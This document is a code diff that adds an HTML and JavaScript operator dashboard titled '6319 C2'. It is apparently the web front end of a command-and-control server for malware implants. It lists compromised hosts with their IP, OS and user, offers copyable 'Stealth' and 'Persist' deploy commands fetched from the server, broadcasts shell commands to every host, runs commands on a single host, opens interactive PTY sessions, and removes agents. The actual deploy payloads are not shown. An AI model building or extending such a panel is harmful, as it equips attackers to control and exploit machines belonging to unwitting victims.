@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>6319 C2</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <pre class="ascii-art"> ██████╗ ██████╗  ██╗ █████╗ 
+██╔════╝ ╚════██╗███║██╔══██╗
+███████╗  █████╔╝╚██║╚██████║
+██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
+╚██████╔╝██████╔╝ ██║ █████╔╝
+ ╚═════╝ ╚═════╝  ╚═╝ ╚════╝</pre>
+            </div>
+            <div class="stats-panel">
+                <div class="stat online"><span class="value" id="stat-online">0</span><span class="label">ONLINE</span></div>
+                <div class="stat dead"><span class="value" id="stat-dead">0</span><span class="label">DEAD</span></div>
+                <div class="stat total"><span class="value" id="stat-total">0</span><span class="label">TOTAL</span></div>
+            </div>
+        </header>
+
+        <div class="deploy-box">
+            <div class="deploy-label">DEPLOY COMMANDS</div>
+            <div class="deploy-row"><span class="deploy-type">Stealth:</span><code id="deploy-stealth" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-stealth')" class="btn-copy">COPY</button></div>
+            <div class="deploy-row"><span class="deploy-type">Persist:</span><code id="deploy-persist" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-persist')" class="btn-copy">COPY</button></div>
+        </div>
+
+        <div class="toolbar">
+            <input type="text" id="broadcast-cmd" placeholder="Broadcast command to all hosts...">
+            <button onclick="broadcast()" class="btn btn-accent">BROADCAST</button>
+            <button onclick="refresh()" class="btn">REFRESH</button>
+        </div>
+
+        <div class="main">
+            <div class="panel clients-panel">
+                <div class="panel-header">HOSTS</div>
+                <div id="clients" class="clients-list"></div>
+            </div>
+
+            <div class="panel terminal-panel">
+                <div class="panel-header">
+                    <span id="term-title">SELECT HOST</span>
+                    <div class="term-controls" id="term-controls" style="display:none">
+                        <select id="channel-select" class="channel-select" onchange="switchChannel()"></select>
+                        <button onclick="connectClient()" class="btn-sm btn-green" id="btn-connect">CONNECT</button>
+                        <button onclick="togglePty()" class="btn-sm" id="btn-pty" style="display:none">PTY MODE</button>
+                        <button onclick="destroyClient()" class="btn-sm btn-danger">DESTROY</button>
+                    </div>
+                </div>
+                <div id="term-output" class="term-output"></div>
+                <div id="xterm-container" class="xterm-container" style="display:none"></div>
+                <div class="term-input-row" id="term-input-row">
+                    <span class="prompt">$</span>
+                    <input type="text" id="term-input" placeholder="command..." disabled>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+let selectedHost=null,selectedChannel=null,selected=null,selectedClient=null,sse=null,socket=null,term=null,fitAddon=null,ptyMode=false,ptySessionId=null,hostsData=[];
+
+socket=io();
+socket.on('connect',()=>console.log('WebSocket connected'));
+socket.on('pty_opening',d=>{ptySessionId=d.session_id;});
+socket.on('pty_ready',d=>{if(term)term.focus();});
+socket.on('pty_output',d=>{if(term&&d.session_id===ptySessionId)term.write(d.data);});
+socket.on('pty_closed',d=>{if(d.session_id===ptySessionId){closePty();term.write('\r\n\x1b[1;31m[PTY Closed]\x1b[0m\r\n');}});
+socket.on('error',d=>alert(d.message));
+
+async function refresh(){
+    const[hosts,stats]=await Promise.all([fetch('/api/clients').then(r=>r.json()),fetch('/api/stats').then(r=>r.json())]);
+    hostsData=hosts;
+    document.getElementById('stat-online').textContent=stats.online;
+    document.getElementById('stat-dead').textContent=stats.dead||0;
+    document.getElementById('stat-total').textContent=stats.total;
+    document.getElementById('deploy-stealth').textContent=stats.deploy_stealth;
+    document.getElementById('deploy-persist').textContent=stats.deploy_persist;
+    
+    const list=document.getElementById('clients');
+    list.innerHTML='';
+    hosts.forEach(h=>{
+        const el=document.createElement('div');
+        const statusClass=h.overall_online?'online':(h.overall_status==='beacon'?'beacon':(h.overall_status==='sleeping'?'sleeping':'dark'));
+        el.className=`client ${statusClass} ${selectedHost===h.host_key?'selected':''}`;
+        el.onclick=(e)=>selectHost(h,e);
+        
+        const channelBadges=h.channel_list.map(ch=>{
+            const chData=h.channels[ch];
+            let chStatus='offline';
+            if(chData.online)chStatus='online';
+            else if(chData.status==='beacon')chStatus='beacon';
+            return `<span class="channel-pill ${ch} ${chStatus}">${ch.toUpperCase()}</span>`;
+        }).join('');
+        
+        el.innerHTML=`
+            <div class="client-row">
+                <span class="status-dot ${statusClass}"></span>
+                <span class="hostname">${h.hostname}</span>
+                <div class="channel-pills">${channelBadges}</div>
+            </div>
+            <div class="client-details">
+                <div><span class="lbl">IP:</span> ${h.ip}</div>
+                <div><span class="lbl">OS:</span> ${h.os}</div>
+                <div><span class="lbl">User:</span> ${h.user}</div>
+                <div><span class="lbl">Last seen:</span> ${h.last_seen_ago}</div>
+            </div>`;
+        list.appendChild(el);
+    });
+    
+    if(selectedHost&&selectedChannel){
+        const host=hosts.find(h=>h.host_key===selectedHost);
+        if(host&&host.channels[selectedChannel]){
+            selectedClient=host.channels[selectedChannel];
+            selected=selectedClient.id;
+            updateControls();
+        }
+    }
+}
+
+function selectHost(h,e){
+    if(ptyMode)closePty();
+    selectedHost=h.host_key;
+    
+    const channelSelect=document.getElementById('channel-select');
+    channelSelect.innerHTML='';
+    h.channel_list.forEach(ch=>{
+        const opt=document.createElement('option');
+        opt.value=ch;
+        const chData=h.channels[ch];
+        opt.textContent=`${ch.toUpperCase()} (${chData.online?'ONLINE':chData.status.toUpperCase()})`;
+        channelSelect.appendChild(opt);
+    });
+    
+    const defaultChannel=h.channel_list.find(ch=>h.channels[ch].online)||h.channel_list[0];
+    channelSelect.value=defaultChannel;
+    selectedChannel=defaultChannel;
+    
+    const chData=h.channels[selectedChannel];
+    selected=chData.id;
+    selectedClient=chData;
+    
+    document.getElementById('term-title').textContent=`${h.hostname}`;
+    document.getElementById('term-controls').style.display='flex';
+    document.querySelectorAll('.client').forEach(el=>el.classList.remove('selected'));
+    if(e&&e.currentTarget)e.currentTarget.classList.add('selected');
+    
+    updateControls();
+    
+    if(sse)sse.close();
+    sse=new EventSource(`/api/clients/${selected}/shell`);
+    sse.onmessage=e=>showResult(JSON.parse(e.data));
+    fetch(`/api/clients/${selected}/results`).then(r=>r.json()).then(results=>{clearTerm();results.forEach(showResult);});
+}
+
+function switchChannel(){
+    const ch=document.getElementById('channel-select').value;
+    if(!selectedHost)return;
+    
+    const host=hostsData.find(h=>h.host_key===selectedHost);
+    if(!host||!host.channels[ch])return;
+    
+    if(ptyMode)closePty();
+    selectedChannel=ch;
+    const chData=host.channels[ch];
+    selected=chData.id;
+    selectedClient=chData;
+    
+    updateControls();
+    
+    if(sse)sse.close();
+    sse=new EventSource(`/api/clients/${selected}/shell`);
+    sse.onmessage=e=>showResult(JSON.parse(e.data));
+    fetch(`/api/clients/${selected}/results`).then(r=>r.json()).then(results=>{clearTerm();results.forEach(showResult);});
+}
+
+function updateControls(){
+    const c=selectedClient;
+    if(!c)return;
+    
+    document.getElementById('btn-connect').style.display=c.online?'none':'inline-block';
+    document.getElementById('btn-pty').style.display=(c.online&&c.pty_support)?'inline-block':'none';
+    document.getElementById('term-input').disabled=!c.online;
+}
+
+function connectClient(){
+    if(!selected)return;
+    fetch(`/api/clients/${selected}/connect`,{method:'POST'}).then(r=>r.json()).then(d=>{
+        alert(d.status==='already_online'?'Already online':d.message||'Queued - will connect on next beacon');
+        refresh();
+    });
+}
+
+function destroyClient(){
+    console.log('destroyClient called, selected=', selected);
+    if(!selected){alert('ERROR: No client selected! Click on a host first.');return;}
+    console.log('Sending destroy to:', selected);
+    fetch(`/api/clients/${selected}/destroy`,{method:'POST'})
+        .then(r=>{console.log('Response status:', r.status);return r.json();})
+        .then(d=>{
+            console.log('Destroy response:', d);
+            alert(d.message || 'Agent destroyed');
+            selected=null;selectedClient=null;selectedHost=null;selectedChannel=null;
+            document.getElementById('term-title').textContent='SELECT HOST';
+            document.getElementById('term-controls').style.display='none';
+            if(ptyMode)closePty();
+            refresh();
+        })
+        .catch(e=>{console.error('Destroy error:', e);alert('ERROR: '+e);});
+}
+
+function pingAll(){
+    fetch('/api/ping_all',{method:'POST'}).then(r=>r.json()).then(d=>{
+        let msg=`Total: ${d.total}\nOnline: ${d.online}\nBeacon: ${d.beacon}\nSleeping: ${d.sleeping}\nDark: ${d.dark}`;
+        alert(msg);
+    });
+}
+
+function togglePty(){
+    if(!selectedClient||!selectedClient.online||!selectedClient.pty_support)return;
+    if(ptyMode){closePty();}
+    else{openPty();}
+}
+
+function openPty(){
+    ptyMode=true;
+    document.getElementById('term-output').style.display='none';
+    document.getElementById('term-input-row').style.display='none';
+    document.getElementById('xterm-container').style.display='block';
+    document.getElementById('btn-pty').textContent='CLOSE PTY';
+    document.getElementById('btn-pty').classList.add('btn-green');
+    
+    if(!term){
+        term=new Terminal({cursorBlink:true,theme:{background:'#2e3440',foreground:'#eceff4',cursor:'#88c0d0'}});
+        fitAddon=new FitAddon.FitAddon();
+        term.loadAddon(fitAddon);
+        term.open(document.getElementById('xterm-container'));
+        term.onData(data=>{if(ptySessionId)socket.emit('pty_input',{session_id:ptySessionId,data:data});});
+        term.onResize(({cols,rows})=>{if(ptySessionId)socket.emit('pty_resize',{session_id:ptySessionId,cols:cols,rows:rows});});
+        window.addEventListener('resize',()=>{if(fitAddon&&ptyMode)fitAddon.fit();});
+    }
+    fitAddon.fit();
+    socket.emit('pty_open',{client_id:selected,cols:term.cols,rows:term.rows});
+}
+
+function closePty(){
+    ptyMode=false;
+    document.getElementById('term-output').style.display='block';
+    document.getElementById('term-input-row').style.display='flex';
+    document.getElementById('xterm-container').style.display='none';
+    document.getElementById('btn-pty').textContent='PTY MODE';
+    document.getElementById('btn-pty').classList.remove('btn-green');
+    if(ptySessionId){socket.emit('pty_close',{session_id:ptySessionId});ptySessionId=null;}
+    if(term)term.clear();
+}
+
+function showResult(data){
+    const out=document.getElementById('term-output');
+    const cmd=document.createElement('div');
+    cmd.className='cmd-line';
+    cmd.innerHTML=`<span class="prompt">$</span> ${esc(data.cmd?.data||'')}`;
+    out.appendChild(cmd);
+    if(data.result){
+        const res=document.createElement('div');
+        res.className='result';
+        if(data.result.stdout)res.innerHTML+=`<pre>${esc(data.result.stdout)}</pre>`;
+        if(data.result.stderr)res.innerHTML+=`<pre class="stderr">${esc(data.result.stderr)}</pre>`;
+        if(data.result.error)res.innerHTML+=`<pre class="error">${esc(data.result.error)}</pre>`;
+        out.appendChild(res);
+    }
+    out.scrollTop=out.scrollHeight;
+}
+function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML;}
+function clearTerm(){document.getElementById('term-output').innerHTML='';}
+function execCmd(cmd){if(!selected||!cmd)return;fetch(`/api/clients/${selected}/exec`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});}
+function broadcast(){
+    const cmd=document.getElementById('broadcast-cmd').value;
+    if(!cmd)return;
+    fetch('/api/broadcast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})}).then(r=>r.json()).then(d=>{
+        alert(`Sent: ${d.sent}, Queued: ${d.queued}`);
+        document.getElementById('broadcast-cmd').value='';
+    });
+}
+function copyCmd(id){
+    const t=document.getElementById(id).textContent;
+    if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(t);}
+    else{const a=document.createElement('textarea');a.value=t;a.style.cssText='position:fixed;left:-9999px';document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);}
+    const b=event.target;b.textContent='COPIED';b.style.background='var(--green)';setTimeout(()=>{b.textContent='COPY';b.style.background='';},1000);
+}
+document.getElementById('term-input').addEventListener('keypress',e=>{if(e.key==='Enter'){execCmd(e.target.value);e.target.value='';}});
+document.getElementById('broadcast-cmd').addEventListener('keypress',e=>{if(e.key==='Enter')broadcast();});
+refresh();setInterval(refresh,5000);
+</script>
+</body>
+</html>
